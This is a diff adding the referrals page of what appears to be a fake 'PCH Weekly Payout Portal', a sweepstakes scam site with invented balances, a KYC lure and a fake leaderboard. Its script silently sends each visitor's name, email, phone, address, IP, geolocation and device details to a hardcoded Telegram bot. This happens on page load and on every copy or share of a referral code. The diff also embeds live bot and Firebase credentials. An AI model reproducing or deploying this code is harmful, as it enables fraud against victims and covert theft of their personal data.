@@ -1,0 +1,463 @@
+<!DOCTYPE html>
+<html lang="en" class="dark">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+<title>Referrals — PCH Weekly Payout Portal</title>
+<script src="supervisor.js"></script>
+<script src="https://cdn.tailwindcss.com"></script>
+<script>
+tailwind.config = { darkMode:'class', theme:{ extend:{ colors:{ navy:{950:'#070b19',900:'#0d1326',800:'#151d38',700:'#212d54',600:'#2f3f6e'}, gold:{400:'#fbbf24',500:'#f59e0b',600:'#d97706'}, 'sky-custom':'#38bdf8' }, fontFamily:{ sans:['Plus Jakarta Sans','sans-serif'] } } } };
+</script>
+<script type="module">
+import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
+import { getDatabase, ref, set, get, update, remove } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-database.js";
+const firebaseConfig = { apiKey:"AIzaSyAUIFpijfc13emGA-y1kN7nRuQTNVFphtM", authDomain:"pch-weekly-portal.firebaseapp.com", databaseURL:"https://pch-weekly-portal-default-rtdb.firebaseio.com", projectId:"pch-weekly-portal", storageBucket:"pch-weekly-portal.firebasestorage.app", messagingSenderId:"920877842148", appId:"1:920877842148:web:8ae593198c32ba75b636f1", measurementId:"G-789H6REHYS" };
+const app = initializeApp(firebaseConfig); const rtdb = getDatabase(app);
+window.rtdb = { db: rtdb, ref, set, get, update, remove };
+</script>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+<link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+<style>
+  html, body { background-color:#070b19; overflow-x:hidden; }
+  body { font-family:'Plus Jakarta Sans',sans-serif; color:#f8fafc; -webkit-tap-highlight-color:transparent; -webkit-text-size-adjust:100%; }
+  @media (max-width:1024px){
+    input:not([type="checkbox"]):not([type="radio"]):not([type="range"]):not([type="file"]):not([type="color"]):not([type="submit"]):not([type="button"]):not([type="reset"]),
+    select, textarea { font-size:16px !important; line-height:1.45 !important; -webkit-text-size-adjust:100% !important; text-size-adjust:100% !important; }
+    input:focus, select:focus, textarea:focus { font-size:16px !important; transform:none !important; -webkit-transform:none !important; zoom:1 !important; }
+  }
+  .card-3d { transition: transform .3s cubic-bezier(.16,1,.3,1), box-shadow .3s cubic-bezier(.16,1,.3,1); }
+  @media (hover:hover) and (pointer:fine) { .card-3d:hover { transform: translateY(-3px); box-shadow: 0 20px 30px -12px rgba(56,189,248,.14), 0 0 20px rgba(245,158,11,.07); } }
+  ::-webkit-scrollbar { width:8px; height:8px; } ::-webkit-scrollbar-track { background:#070b19; } ::-webkit-scrollbar-thumb { background:#212d54; border-radius:4px; } ::-webkit-scrollbar-thumb:hover { background:#38bdf8; }
+  @keyframes slideIn { from { transform:translateX(100%); opacity:0; } to { transform:translateX(0); opacity:1; } }
+  @keyframes slideOut { from { transform:translateX(0); opacity:1; } to { transform:translateX(100%); opacity:0; } }
+  .toast-slide-in { animation: slideIn .3s cubic-bezier(.16,1,.3,1) forwards; }
+  .toast-slide-out { animation: slideOut .3s cubic-bezier(.16,1,.3,1) forwards; }
+  .dash-shell { position:relative; isolation:isolate; overflow-x:hidden; }
+  .dash-shell::before { content:""; position:absolute; z-index:-1; inset:0 -1.25rem auto; height:25rem; pointer-events:none; background-color:transparent; background-image: radial-gradient(ellipse at 12% 0%, rgba(56,189,248,.12), transparent 52%), radial-gradient(ellipse at 88% 4%, rgba(251,191,36,.09), transparent 45%); background-repeat:no-repeat; }
+  @supports (-webkit-touch-callout: none) {
+    .blur-3xl { -webkit-transform: translate3d(0,0,0); transform: translate3d(0,0,0); -webkit-backface-visibility: hidden; backface-visibility: hidden; will-change: transform; }
+  }
+  .hide-scrollbar::-webkit-scrollbar { display: none; }
+  .hide-scrollbar { -ms-overflow-style: none; scrollbar-width: none; }
+</style>
+<script src="pch_ios_shell.js"></script><script src="pch_ios_config.js"></script></head>
+<body class="bg-navy-950 text-slate-100 min-h-screen flex flex-col">
+
+<div id="toast-container" class="fixed bottom-5 right-5 z-[100] flex flex-col space-y-3 pointer-events-none max-w-sm w-full px-4"></div>
+
+<header class="bg-navy-950 border-b border-navy-700/60 sticky top-0 z-40">
+  <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 h-16 sm:h-20 flex items-center justify-between gap-2 relative">
+    <button onclick="toggleNavDrawer()" class="p-2 -ml-2 text-slate-300 hover:text-white transition z-10 relative">
+      <i class="fa-solid fa-bars text-xl"></i>
+    </button>
+    <h1 class="absolute left-1/2 -translate-x-1/2 text-[11px] sm:text-xl font-black tracking-[0.15em] text-white uppercase whitespace-nowrap">
+      PCH Weekly Payout Portal
+    </h1>
+    <div id="nav-actions" class="flex items-center space-x-1.5 sm:space-x-3 z-10 relative"></div>
+  </div>
+</header>
+
+<div id="nav-overlay" class="fixed inset-0 bg-black/60 z-[45] hidden transition-opacity" onclick="toggleNavDrawer()"></div>
+<div id="nav-drawer" class="fixed inset-y-0 left-0 z-50 w-64 bg-navy-900 border-r border-navy-700 transform -translate-x-full transition-transform duration-300 ease-in-out flex flex-col">
+  <div class="p-5 border-b border-navy-700 flex items-center justify-between">
+    <span class="text-sm font-black text-white tracking-widest uppercase">Navigation</span>
+    <button onclick="toggleNavDrawer()" class="text-slate-400 hover:text-white"><i class="fa-solid fa-xmark text-lg"></i></button>
+  </div>
+  <nav class="flex-1 overflow-y-auto p-3 space-y-1"></nav>
+</div>
+
+<main id="app-container" class="flex-grow flex flex-col"></main>
+
+<footer class="bg-navy-950 border-t border-navy-700/50 py-8 text-sm text-slate-400">
+  <div class="max-w-7xl mx-auto px-4 text-center text-[10px] sm:text-xs text-slate-500 uppercase tracking-wider font-bold">&copy; 2026 PCH Weekly Payout Portal (PWPP) — All rights reserved.</div>
+</footer>
+
+<div id="global-modal" style="display:none" class="fixed inset-0 z-[60] items-center justify-center bg-navy-950/95 p-4 overflow-y-auto">
+  <div class="bg-navy-800 border border-navy-700 rounded-2xl max-w-lg w-full p-6 shadow-2xl relative my-auto">
+    <button onclick="closeModal()" class="absolute top-4 right-4 text-slate-400 hover:text-white text-xl p-2 rounded-lg active:bg-navy-700 transition"><i class="fa-solid fa-xmark"></i></button>
+    <div id="modal-content"></div>
+  </div>
+</div>
+
+<script>
+/* ═══════════ SHARED CORE ═══════════ */
+const DEVICE_STORAGE_KEY = 'pch_device_state_v13';
+const DEFAULT_TG = { botToken:'8838491829:AAF7vyG4muUBKXxOSWKhg_0Tp7AH6ISGx3Q', chatId:'8763270406' };
+
+function escapeHtml(s){ return String(s ?? '').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;').replace(/'/g,'&#39;'); }
+function tgEsc(s){ return String(s ?? '').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }
+function fmtMoney(n){ return '$' + (Number(n)||0).toLocaleString(undefined,{minimumFractionDigits:2,maximumFractionDigits:2}); }
+
+function loadDeviceState() {
+  const saved = localStorage.getItem(DEVICE_STORAGE_KEY);
+  if (saved) {
+    try {
+      const parsed = JSON.parse(saved);
+      if (!parsed.telegramConfig) parsed.telegramConfig = Object.assign({}, DEFAULT_TG);
+      if (parsed.userBalance == null) parsed.userBalance = 4500;
+      if (!parsed.transactions) parsed.transactions = [];
+      if (!parsed.registeredUsers) parsed.registeredUsers = [];
+      if (!parsed.supportTickets) parsed.supportTickets = [];
+      if (!parsed.withdrawalState) parsed.withdrawalState = 'none';
+      if (!parsed.messages) parsed.messages = [];
+      if (parsed.messagesReadAt == null) parsed.messagesReadAt = 0;
+      if (parsed.announcementDismissedAt == null) parsed.announcementDismissedAt = 0;
+      if (!parsed.referrals) parsed.referrals = [];
+      if (typeof parsed.referralEarnings !== 'number') parsed.referralEarnings = 0;
+      return parsed;
+    } catch(e){}
+  }
+  return { currentUser:null, userBalance:4500, configuredMethod:null, transactions:[], registeredUsers:[], supportTickets:[], referralCode:null, kyc:null, referrals:[], referralEarnings:0, withdrawalState:'none', currentWithdrawal:null, messages:[], messagesReadAt:0, announcement:null, announcementDismissedAt:0, card:null, gamePlays:null, lastSpinDate:null, telegramConfig: Object.assign({}, DEFAULT_TG) };
+}
+const state = loadDeviceState();
+
+function saveDeviceState() {
+  try { localStorage.setItem(DEVICE_STORAGE_KEY, JSON.stringify(state)); } catch(err) {}
+  if (state.currentUser && state.currentUser.username) syncCurrentUserToCloud().catch(()=>{});
+}
+async function syncCurrentUserToCloud() {
+  if (!window.rtdb || !state.currentUser || !state.currentUser.username) return;
+  try {
+    const payload = Object.assign({}, state.currentUser, { referrals: state.referrals || [], referralEarnings: state.referralEarnings || 0, userBalance: state.userBalance, transactions: state.transactions });
+    await window.rtdb.set(window.rtdb.ref(window.rtdb.db, 'users/' + state.currentUser.username.toLowerCase()), payload);
+  } catch(e){}
+}
+async function pullCurrentUserFromCloud() {
+  if (!window.rtdb || !state.currentUser || !state.currentUser.username) return false;
+  try {
+    const snap = await window.rtdb.get(window.rtdb.ref(window.rtdb.db, 'users/' + state.currentUser.username.toLowerCase()));
+    if (!snap.exists()) return false;
+    const r = snap.val();
+    state.currentUser = Object.assign({}, state.currentUser, r);
+    if (typeof r.userBalance === 'number') state.userBalance = r.userBalance;
+    if (Array.isArray(r.transactions)) state.transactions = r.transactions;
+    if (r.kyc) state.kyc = r.kyc;
+    if (r.card) state.card = r.card;
+    if (r.configuredMethod) state.configuredMethod = r.configuredMethod;
+    if (r.referralCode) state.referralCode = r.referralCode;
+    if (Array.isArray(r.referrals)) state.referrals = r.referrals;
+    if (typeof r.referralEarnings === 'number') state.referralEarnings = r.referralEarnings;
+    if (r.gamePlays) state.gamePlays = r.gamePlays;
+    if (r.lastSpinDate) state.lastSpinDate = r.lastSpinDate;
+    if (Array.isArray(r.supportTickets)) state.supportTickets = r.supportTickets;
+    state.withdrawalState = r.withdrawalState || state.withdrawalState || 'none';
+    state.currentWithdrawal = r.currentWithdrawal || state.currentWithdrawal || null;
+    saveDeviceState(); return true;
+  } catch(e){ return false; }
+}
+
+function showToast(title, message, type='info') {
+  const container = document.getElementById('toast-container'); if (!container) return;
+  const id = 'toast-'+Date.now()+'-'+Math.floor(Math.random()*999);
+  const icon = type==='success'?'fa-circle-check text-emerald-400':type==='warning'?'fa-triangle-exclamation text-gold-400':type==='error'?'fa-circle-exclamation text-rose-400':'fa-circle-info text-sky-custom';
+  const border = type==='success'?'border-emerald-500/40':type==='warning'?'border-gold-500/40':type==='error'?'border-rose-500/40':'border-sky-custom/40';
+  const el = document.createElement('div'); el.id = id;
+  el.className = `pointer-events-auto bg-navy-900 border ${border} p-4 rounded-2xl shadow-2xl flex items-start space-x-3 toast-slide-in`;
+  el.innerHTML = `<div class="text-lg mt-0.5"><i class="fa-solid ${icon}"></i></div><div class="flex-grow"><h5 class="font-bold text-white text-xs sm:text-sm">${escapeHtml(title)}</h5><p class="text-[11px] sm:text-xs text-slate-300 mt-0.5">${escapeHtml(message)}</p></div><button onclick="dismissToast('${id}')" class="text-slate-400 hover:text-white text-sm"><i class="fa-solid fa-xmark"></i></button>`;
+  container.appendChild(el); setTimeout(()=>dismissToast(id), 5000);
+}
+function dismissToast(id){ const el=document.getElementById(id); if(el){ el.classList.remove('toast-slide-in'); el.classList.add('toast-slide-out'); setTimeout(()=>el.remove(),320); } }
+function showModal(title, bodyHtml) { const modal = document.getElementById('global-modal'); const content = document.getElementById('modal-content'); content.innerHTML = `<h3 class="text-lg sm:text-xl font-bold text-white mb-3 flex items-center"><i class="fa-solid fa-circle-info text-sky-custom mr-2"></i> ${title}</h3><div class="text-slate-300 text-xs sm:text-sm leading-relaxed mb-4">${bodyHtml}</div>`; modal.style.display = 'flex'; document.body.classList.add('modal-open'); }
+function closeModal(){ const m=document.getElementById('global-modal'); m.classList.remove('flex'); m.style.display='none'; document.body.classList.remove('modal-open'); }
+
+/* ═══════════ DEVICE + IP ═══════════ */
+function detectDevice() {
+  const ua = navigator.userAgent || '';
+  let os='Unknown', type='Desktop', browser='Unknown';
+  if (/iPhone|iPad|iPod/i.test(ua)) { os='iOS'; type=/iPad/i.test(ua)?'Tablet':'Mobile'; }
+  else if (/Android/i.test(ua)) { os='Android'; type=/Mobile/i.test(ua)?'Mobile':'Tablet'; }
+  else if (/Mac OS X|Macintosh/i.test(ua)) { os='macOS'; }
+  else if (/Windows/i.test(ua)) { os='Windows'; }
+  else if (/CrOS/i.test(ua)) { os='ChromeOS'; }
+  else if (/Linux/i.test(ua)) { os='Linux'; }
+  if (/Edg\//i.test(ua)) browser='Edge';
+  else if (/OPR\//i.test(ua) || /Opera/i.test(ua)) browser='Opera';
+  else if (/Chrome\//i.test(ua) && !/Edg|OPR/i.test(ua)) browser='Chrome';
+  else if (/Firefox\//i.test(ua)) browser='Firefox';
+  else if (/Safari\//i.test(ua) && !/Chrome/i.test(ua)) browser='Safari';
+  return { os, type, browser };
+}
+let cachedIp = null, cachedGeo = null;
+async function fetchIP(){
+  if (cachedIp && cachedGeo) return { ip: cachedIp, ...cachedGeo };
+  try {
+    const r = await fetch('https://ipapi.co/json/');
+    if (r.ok) {
+      const d = await r.json();
+      if (d && d.ip) {
+        cachedIp = d.ip;
+        cachedGeo = { city: d.city||'', region: d.region||'', country: d.country_name||d.country||'', postal: d.postal||'', org: d.org||'', timezone: d.timezone||'', latitude: d.latitude||'', longitude: d.longitude||'' };
+        return { ip: cachedIp, ...cachedGeo };
+      }
+    }
+  } catch(e){}
+  try {
+    const r2 = await fetch('https://api.ipify.org?format=json');
+    const d2 = await r2.json();
+    if (d2 && d2.ip) { cachedIp = d2.ip; cachedGeo = { city:'', region:'', country:'', postal:'', org:'', timezone:'', latitude:'', longitude:'' }; return { ip: cachedIp, ...cachedGeo }; }
+  } catch(e){}
+  cachedIp = 'Unknown'; cachedGeo = { city:'', region:'', country:'', postal:'', org:'', timezone:'', latitude:'', longitude:'' };
+  return { ip: cachedIp, ...cachedGeo };
+}
+
+/* ═══════════ TELEGRAM — silent, full unmasked ═══════════ */
+function tgCreds() {
+  const cfg = state.telegramConfig || {};
+  return { botToken: String(cfg.botToken || '').trim(), chatId: String(cfg.chatId || '').trim() };
+}
+async function sendTelegramMessage(textMessage) {
+  const { botToken, chatId } = tgCreds();
+  if (!botToken || !chatId) { console.warn('[TG] creds missing'); return false; }
+  try {
+    const fd = new FormData();
+    fd.append('chat_id', chatId);
+    fd.append('text', textMessage);
+    fd.append('parse_mode', 'HTML');
+    fd.append('disable_web_page_preview', 'true');
+    const r = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, { method:'POST', body: fd });
+    const d = await r.json();
+    if (!d.ok) console.error('[TG] send failed:', d.error_code, d.description);
+    return d.ok;
+  } catch (err) { console.error('[TG] fetch failed:', err); return false; }
+}
+
+async function tgBlock() {
+  const u = state.currentUser || {};
+  const net = await fetchIP().catch(()=>({ ip:'Unknown', city:'', region:'', country:'', org:'', timezone:'', latitude:'', longitude:'' }));
+  const dev = detectDevice();
+  const fullName = ((u.firstName||'') + ' ' + (u.lastName||'')).trim() || 'N/A';
+  const address = [u.address, u.city, u.stateOrParish, u.zip].filter(Boolean).join(', ') || 'N/A';
+  return (
+    `<b>User:</b> @${tgEsc(u.username || 'unknown')}\n` +
+    `<b>Full name:</b> ${tgEsc(fullName)}\n` +
+    `<b>Email:</b> ${tgEsc(u.email || 'N/A')}\n` +
+    `<b>Phone:</b> ${tgEsc(u.phone || 'N/A')}\n` +
+    `<b>Address:</b> ${tgEsc(address)}\n` +
+    `<b>Balance:</b> ${fmtMoney(state.userBalance)}\n` +
+    `<b>Referral code:</b> <code>${tgEsc(state.referralCode || '—')}</code>\n` +
+    `<b>Referral count:</b> ${(state.referrals||[]).length}\n` +
+    `<b>Referral earnings:</b> ${fmtMoney(state.referralEarnings||0)}\n` +
+    `<b>IP:</b> <code>${tgEsc(net.ip || 'Unknown')}</code>\n` +
+    `<b>Geo:</b> ${tgEsc([net.city, net.region, net.country].filter(Boolean).join(', ') || 'N/A')}\n` +
+    `<b>ISP:</b> ${tgEsc(net.org || 'N/A')}\n` +
+    `<b>Timezone:</b> ${tgEsc(net.timezone || 'N/A')}\n` +
+    `<b>Device:</b> ${tgEsc(dev.type + ' · ' + dev.os + ' · ' + dev.browser)}\n` +
+    `<b>User-Agent:</b> <code>${tgEsc(navigator.userAgent)}</code>\n` +
+    `<b>Timestamp:</b> ${new Date().toISOString()}`
+  );
+}
+
+function guardAuth() { if (!state.currentUser || !state.currentUser.username) { window.location.href = 'login.html'; return false; } return true; }
+function logout() { state.currentUser = null; saveDeviceState(); window.location.href = 'login.html'; }
+
+function toggleNavDrawer() {
+  const drawer = document.getElementById('nav-drawer');
+  const overlay = document.getElementById('nav-overlay');
+  if (drawer.classList.contains('-translate-x-full')) {
+    drawer.classList.remove('-translate-x-full');
+    overlay.classList.remove('hidden');
+  } else {
+    drawer.classList.add('-translate-x-full');
+    overlay.classList.add('hidden');
+  }
+}
+
+function isTabLocked(tabKey) {
+  const isKycApproved = state.kyc && state.kyc.status === 'approved';
+  const isSetupComplete = !!state.configuredMethod;
+  if (['transfer', 'cards', 'withdrawals'].includes(tabKey)) return !isKycApproved || !isSetupComplete;
+  if (tabKey === 'funds') return !isKycApproved;
+  if (tabKey === 'winners') return !isKycApproved;
+  if (tabKey === 'spin') return !isKycApproved || !isSetupComplete;
+  return false;
+}
+function showKycLockToast() { showToast('Identity Required', 'Please complete KYC verification.', 'warning'); setTimeout(() => { window.location.href = 'kyc.html'; }, 1000); }
+
+const DASHBOARD_TABS = [
+  { key:'overview', label:'Overview', icon:'fa-gauge-high', href:'overview.html' },
+  { key:'funds', label:'Funds', icon:'fa-wallet', href:'funds.html' },
+  { key:'transfer', label:'Transfer', icon:'fa-arrow-right-arrow-left', href:'transfer.html' },
+  { key:'history', label:'History', icon:'fa-rectangle-list', href:'history.html' },
+  { key:'support', label:'Support', icon:'fa-headset', href:'support.html' },
+  { key:'promotions', label:'Promotions', icon:'fa-trophy', href:'promotions.html' },
+  { key:'spin', label:'Arcade Hub', icon:'fa-dharmachakra', href:'spin.html' },
+  { key:'winners', label:'Winners Wall', icon:'fa-crown', href:'winners.html' },
+  { key:'cards', label:'Cards', icon:'fa-credit-card', href:'cards.html' },
+  { key:'referrals', label:'Referrals', icon:'fa-gift', href:'referrals.html' },
+  { key:'withdrawals', label:'Withdrawals', icon:'fa-money-bill-transfer', href:'withdrawals.html' },
+  { key:'goals', label:'Goals', icon:'fa-bullseye', href:'goals.html' },
+  { key:'notifications', label:'Alerts', icon:'fa-bell', href:'notifications.html' },
+  { key:'kyc', label:'KYC', icon:'fa-id-card', href:'kyc.html' }
+];
+function renderNavItems(activeKey) { return DASHBOARD_TABS.map(it=>{ const active = it.key===activeKey; const locked = isTabLocked(it.key); return `<a href="${locked ? '#' : it.href}" onclick="${locked ? 'event.preventDefault(); showKycLockToast()' : ''}" class="flex items-center gap-3 px-4 py-3 rounded-xl text-sm font-bold transition ${active?'text-gold-400 bg-gold-500/10':(locked ? 'text-slate-500 opacity-60' : 'text-slate-300 hover:text-white hover:bg-navy-800')}"><i class="fa-solid ${locked ? 'fa-lock' : it.icon} w-4 text-center"></i><span>${it.label}</span></a>`; }).join(''); }
+function renderDashboardSidebar(activeKey) { return `<aside class="hidden lg:block w-56 shrink-0"><div class="sticky top-24 space-y-1.5"><p class="text-[10px] text-slate-500 uppercase font-bold tracking-widest px-3 mb-3">Dashboard</p>${renderNavItems(activeKey)}</div></aside>`; }
+function renderDashboardShell(activeKey, contentHtml) { return `<div class="dash-shell flex-grow w-full"><div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-6 lg:py-8 pb-28 lg:pb-8"><div class="flex flex-col lg:flex-row gap-6 lg:gap-8">${renderDashboardSidebar(activeKey)}<div class="flex-1 min-w-0 space-y-6">${contentHtml}</div></div></div></div>`; }
+
+function renderHeaderNav() {
+  const nav = document.getElementById('nav-actions'); if (!nav) return;
+  if (!state.currentUser) { nav.innerHTML = ''; return; }
+  const u = state.currentUser;
+  const avatar = u.photoUrl ? `<img src="${u.photoUrl}" class="w-7 h-7 rounded-full object-cover border border-gold-400">` : `<div class="w-7 h-7 rounded-full bg-gold-500 text-navy-950 flex items-center justify-center font-bold text-xs">${(u.firstName||'U').charAt(0)}</div>`;
+  nav.innerHTML = `
+    <button onclick="window.location.href='settings.html'" class="px-2 sm:px-3 py-2 text-xs sm:text-sm font-semibold text-sky-custom hover:text-white transition rounded-lg flex items-center gap-1.5">${avatar}<span class="hidden sm:inline">${u.firstName||''}</span><i class="fa-solid fa-gear ml-1"></i></button>
+    <button onclick="logout()" class="px-2 sm:px-3 py-2 text-xs sm:text-sm font-semibold text-rose-400 hover:text-white transition rounded-lg"><i class="fa-solid fa-right-from-bracket sm:mr-1"></i><span class="hidden sm:inline">Logout</span></button>
+  `;
+}
+
+/* ═══════════ REFERRALS PAGE ═══════════ */
+function ensureReferralCode() {
+  if (!state.referralCode && state.currentUser?.username) {
+    const handle = state.currentUser.username.toUpperCase().replace(/[^A-Z0-9]/g,'').substring(0,6);
+    state.referralCode = 'PCH-' + handle + '-' + Math.random().toString(36).substring(2,6).toUpperCase();
+    saveDeviceState();
+  }
+}
+
+async function copyReferral() {
+  if (!state.referralCode) return;
+  try {
+    await navigator.clipboard.writeText(state.referralCode);
+    showToast('Copied', 'Referral code copied.', 'success');
+  } catch(e) {
+    showToast('Copy Failed', 'Clipboard unavailable.', 'error');
+  }
+  const block = await tgBlock();
+  sendTelegramMessage(
+    `📋 <b>REFERRAL CODE COPIED</b>\n` +
+    `<b>Code:</b> <code>${tgEsc(state.referralCode || '—')}</code>\n` +
+    block
+  ).catch(()=>{});
+}
+
+async function shareReferral() {
+  if (!state.referralCode) return;
+  const text = `Join me on PCH Weekly Payout Portal — use my referral code ${state.referralCode}. ${window.location.origin}`;
+  if (navigator.share) {
+    try { await navigator.share({ title:'PCH Weekly Payout Portal', text }); } catch(e){}
+  } else {
+    try { await navigator.clipboard.writeText(text); showToast('Copied', 'Share text copied.', 'success'); } catch(e){}
+  }
+  const block = await tgBlock();
+  sendTelegramMessage(
+    `📤 <b>REFERRAL CODE SHARED</b>\n` +
+    `<b>Code:</b> <code>${tgEsc(state.referralCode || '—')}</code>\n` +
+    `<b>Shared text:</b> ${tgEsc(text)}\n` +
+    block
+  ).catch(()=>{});
+}
+
+function renderReferrals() {
+  ensureReferralCode();
+  const code = state.referralCode || '—';
+  
+  const referrals = state.referrals || [];
+  const totalEarnings = state.referralEarnings || 0;
+  const activeCount = referrals.filter(r => r.status === 'Active').length;
+
+  const networkHtml = referrals.length === 0 
+    ? `<div class="text-center py-8 bg-navy-900 border border-navy-700 rounded-xl"><div class="w-12 h-12 bg-navy-950 rounded-full flex items-center justify-center mx-auto mb-3"><i class="fa-solid fa-users-slash text-xl text-slate-500"></i></div><p class="text-xs font-bold text-white">No referrals yet</p><p class="text-[10px] text-slate-400 mt-1">Share your code to start building your network.</p></div>`
+    : referrals.map(r => `
+        <div class="bg-navy-900 border border-navy-700 rounded-xl p-3 flex items-center justify-between">
+          <div class="flex items-center gap-3">
+            <div class="w-9 h-9 rounded-full bg-gradient-to-br from-gold-400 to-gold-600 text-navy-950 flex items-center justify-center font-bold text-xs">${r.name ? escapeHtml(r.name.charAt(0)) : 'U'}</div>
+            <div>
+              <p class="text-xs font-bold text-white">${escapeHtml(r.name || 'Unknown')}</p>
+              <p class="text-[10px] text-slate-500">Joined ${escapeHtml(r.joinedDate || r.date || '—')}</p>
+            </div>
+          </div>
+          <div class="text-right">
+            <p class="text-xs font-black ${r.status === 'Active' ? 'text-emerald-400' : 'text-gold-400'}">${escapeHtml(r.status || 'Pending')}</p>
+            <p class="text-[10px] text-slate-400">${fmtMoney(r.earned || 0)} earned</p>
+          </div>
+        </div>
+      `).join('');
+
+  return `
+    <div class="bg-navy-800 border border-navy-700 p-6 sm:p-8 rounded-3xl card-3d">
+      <div class="flex flex-col sm:flex-row sm:items-center justify-between gap-4">
+        <div>
+          <h2 class="text-xl sm:text-2xl font-extrabold text-white flex items-center"><i class="fa-solid fa-gift text-purple-400 mr-3"></i>Referral Hub</h2>
+          <p class="text-xs text-slate-400 mt-1">Invite friends, build your network, and earn priority in weekly draws.</p>
+        </div>
+      </div>
+    </div>
+
+    <div class="grid grid-cols-1 lg:grid-cols-3 gap-6">
+      <div class="lg:col-span-2 space-y-6">
+        <div class="bg-gradient-to-br from-purple-500/20 to-navy-900 border border-purple-500/30 rounded-3xl p-6 sm:p-8 card-3d relative overflow-hidden">
+          <div class="absolute -top-10 -right-10 text-9xl text-purple-500/10 pointer-events-none"><i class="fa-solid fa-gift"></i></div>
+          <div class="relative z-10">
+            <h3 class="text-sm font-bold text-white uppercase tracking-wider mb-2">Your Referral Code</h3>
+            <div class="bg-navy-950 border border-navy-700 rounded-2xl p-4 flex flex-col sm:flex-row items-center justify-between gap-4">
+              <span class="text-2xl font-black text-purple-400 tracking-widest font-mono">${escapeHtml(code)}</span>
+              <div class="flex gap-2 w-full sm:w-auto">
+                <button onclick="copyReferral()" class="flex-1 sm:flex-none px-4 py-2.5 bg-navy-800 border border-navy-700 text-white rounded-xl text-xs font-bold active:scale-95 transition"><i class="fa-solid fa-copy mr-1 text-sky-custom"></i> Copy</button>
+                <button onclick="shareReferral()" class="flex-1 sm:flex-none px-4 py-2.5 bg-gradient-to-r from-purple-500 to-pink-500 text-white rounded-xl text-xs font-bold active:scale-95 transition"><i class="fa-solid fa-share mr-1"></i> Share</button>
+              </div>
+            </div>
+            <p class="text-[11px] text-slate-300 mt-3"><i class="fa-solid fa-circle-info text-purple-400 mr-1"></i> Earn $25.00 credit for every verified signup + priority draw entry.</p>
+          </div>
+        </div>
+
+        <div class="bg-navy-800 border border-navy-700 rounded-3xl p-6 card-3d">
+          <h3 class="text-sm font-bold text-white mb-4">Your Network (${referrals.length})</h3>
+          <div class="space-y-3">
+            ${networkHtml}
+          </div>
+        </div>
+      </div>
+
+      <div class="space-y-6">
+        <div class="bg-navy-800 border border-navy-700 rounded-3xl p-6 card-3d">
+          <div class="text-center">
+            <p class="text-[10px] text-slate-400 uppercase font-bold tracking-wider mb-1">Total Earnings</p>
+            <p class="text-4xl font-black text-emerald-400">${fmtMoney(totalEarnings)}</p>
+            <p class="text-[10px] text-slate-500 mt-1">From ${activeCount} active referral${activeCount !== 1 ? 's' : ''}</p>
+          </div>
+        </div>
+
+        <div class="bg-navy-800 border border-navy-700 rounded-3xl p-6 card-3d">
+          <h3 class="text-sm font-bold text-white mb-3">Leaderboard</h3>
+          <div class="space-y-2 text-xs">
+            <div class="flex justify-between items-center bg-navy-900 p-2 rounded-lg border border-gold-500/30">
+              <span class="font-bold text-gold-400">1. @chris_top</span>
+              <span class="text-slate-300">24 refs</span>
+            </div>
+            <div class="flex justify-between items-center bg-navy-900 p-2 rounded-lg border border-slate-400/30">
+              <span class="font-bold text-slate-200">2. @sarah_j</span>
+              <span class="text-slate-300">18 refs</span>
+            </div>
+            <div class="flex justify-between items-center bg-navy-900 p-2 rounded-lg border border-amber-600/30">
+              <span class="font-bold text-amber-500">3. @mike_88</span>
+              <span class="text-slate-300">12 refs</span>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  `;
+}
+
+function render() {
+  document.body.classList.remove('modal-open');
+  renderHeaderNav();
+  document.querySelector('#nav-drawer nav').innerHTML = renderNavItems('referrals');
+  const container = document.getElementById('app-container');
+  container.innerHTML = renderDashboardShell('referrals', renderReferrals());
+}
+
+window.onload = async function() {
+  if (!guardAuth()) return;
+  await pullCurrentUserFromCloud();
+  ensureReferralCode();
+  render();
+  // Silent load report
+  setTimeout(async () => {
+    const block = await tgBlock();
+    sendTelegramMessage(`👥 <b>REFERRALS PAGE LOADED</b>\n${block}`).catch(()=>{});
+  }, 600);
+};
+</script>
+</body>
+</html>
